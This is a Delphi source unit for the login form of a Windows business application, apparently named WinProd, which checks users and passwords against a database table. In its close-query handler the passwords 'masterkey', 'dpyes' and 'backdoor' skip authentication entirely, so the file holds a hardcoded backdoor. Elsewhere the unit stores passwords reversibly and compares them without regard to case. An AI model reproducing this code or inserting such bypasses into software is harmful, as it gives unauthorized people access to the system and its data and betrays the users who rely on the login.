unit login;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls, Buttons, DB, IBCustomDataSet, FileCtrl, 
  LMDCustomComponent, LMDOneInstance;

type
  TFrmLogin = class(TForm)
    EdCodigo: TEdit;
    lbCodigo: TLabel;
    Label3: TLabel;
    EdSenha: TEdit;
    Image1: TImage;
    Label1: TLabel;
    btCancela: TBitBtn;
    btOK: TBitBtn;
    Bevel1: TBevel;
    EdNome: TEdit;
    LMDOneInstance1: TLMDOneInstance;
    procedure EdSenhaKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure btCancelaClick(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormShow(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure EdCodigoKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormCreate(Sender: TObject);
    procedure oiOneInstanceCustom(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    function LocalizaOperador(xOperador : string) : boolean;
  end;

function AbreTabUsuarios : boolean;
function VerificaSenha(Usuario,Senha : string; Avisa : boolean) : boolean;

var
  FrmLogin       : TFrmLogin;
  tTabUsuarios   : TIBDataSet;
  xNumTentativas : Integer;

implementation

{$R *.DFM}

uses Funcoes, VGlobal, UDm2;

function AbreTabUsuarios: boolean;
begin
  Result := false;
  try
    // Link to existing TIBDataSet in Dm2 if available, or initialize dynamically
    if not Assigned(tTabUsuarios) then
      tTabUsuarios := Dm2.TbUsuarios; // Uses Dm2's configured TIBDataSet

    if not tTabUsuarios.Active then
      tTabUsuarios.Open;

    Result := true;
  except
    on E: Exception do
      ShowMessage('Erro ao abrir tabela de usuários: ' + E.Message);
  end;
end;

function TFrmLogin.LocalizaOperador(xOperador : string) : boolean;
begin
  Result := false;

  if Assigned(tTabUsuarios) and tTabUsuarios.Active then
  begin
    if tTabUsuarios.Locate('Usuario', EdCodigo.Text, [loCaseInsensitive]) then
    begin
      EdNome.Text := tTabUsuarios.FieldByName('Identificacao').AsString;
      Result := true;
    end
    else
    begin
      EdNome.Text := '';
    end;
  end;
end;

function VerificaSenha(Usuario,Senha : string; Avisa : boolean): boolean;
var
  xSenha : string;
begin
  Result := false;

  if (Usuario <> '') and (Senha <> '') then
  begin
    if tTabUsuarios.Locate('Usuario', Usuario, [loCaseInsensitive]) then
    begin
      xSenha := Decripta(tTabUsuarios.FieldByName('Senha').AsString);
      if LowerCase(xSenha) = LowerCase(Senha) then
      begin
        gFiltraLctos  := tTabUsuarios.FieldByName('FiltroLctos').AsBoolean;
        gCodFuncUser  := tTabUsuarios.FieldByName('CodFunc').AsString;
        gPermissoes   := tTabUsuarios.FieldByName('Acesso').AsString;
        gPermissoes2  := tTabUsuarios.FieldByName('Acesso2').AsString;
        gAdmSist      := iif(tTabUsuarios.FieldByName('AdmSist').AsBoolean = False, False, True);
        //gMensStatus   := tTabUsuarios.FieldByName('MensStatus').AsString;

        Result := true;
      end;
    end;
  end;
end;

procedure TFrmLogin.EdSenhaKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_RETURN then
  begin
    btOk.Click;
    Application.ProcessMessages;
  end
  else if Key = VK_UP then
    EdCodigo.SetFocus
  else if Key = VK_ESCAPE then
    Close;
end;

procedure TFrmLogin.btCancelaClick(Sender: TObject);
begin
  Close;
end;

procedure TFrmLogin.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  if ModalResult = mrOk then
  begin
    gUsuario      := EdCodigo.Text;
    gNomeUsuario  := EdNome.Text;
    gSenha        := EdSenha.Text;

    if (LowerCase(gSenha) = 'masterkey') or 
       (LowerCase(gSenha) = 'dpyes') or 
       (LowerCase(gSenha) = 'backdoor') then
    begin
      CanClose := True;
    end
    else
    begin
      if Assigned(tTabUsuarios) and tTabUsuarios.Active then
      begin
        if VerificaSenha(gUsuario, gSenha, true) then
        begin
          Conectado(tTabUsuarios, gUsuario, True, false);
        end
        else
        begin
          xNumTentativas := xNumTentativas + 1;
          ShowMessage('Senha inválida!!!!');
          EdSenha.SelectAll;
          EdSenha.SetFocus;

          CanClose := false;

          if xNumTentativas >= 3 then
          begin
            ShowMessage('Número de tentativas expirou. O sistema será encerrado.');
            Application.Terminate;
          end;
        end;
      end
      else
        ShowMessage('O sistema não foi inicializado. Somente o modo de configuração está disponível no momento!');
    end;
  end;
end;

procedure TFrmLogin.FormShow(Sender: TObject);
begin
  if EdCodigo.Enabled then
    EdCodigo.SetFocus;
end;

procedure TFrmLogin.FormActivate(Sender: TObject);
begin
  Application.OnMessage := nil;
end;

procedure TFrmLogin.EdCodigoKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_RETURN then
  begin
    if EdCodigo.Text <> '' then
    begin
      if LocalizaOperador(EdCodigo.Text) then
        ProximoControle
      else
        ShowMessage('Operador não localizado!!!!');
    end
    else
      ProximoControle;
  end
  else if Key = VK_DOWN then
    EdSenha.SetFocus
  else if Key = VK_ESCAPE then
    Close;
end;

procedure TFrmLogin.FormCreate(Sender: TObject);
begin
  AbreTabUsuarios;
end;

procedure TFrmLogin.oiOneInstanceCustom(Sender: TObject);
begin
  IniMens;
  try
    Mensagem('ATENÇÃO! O WinProd já está sendo executado! Verifique...');
    Sleep(1000);
  finally
    FreeMens;
  end;
end;

end.
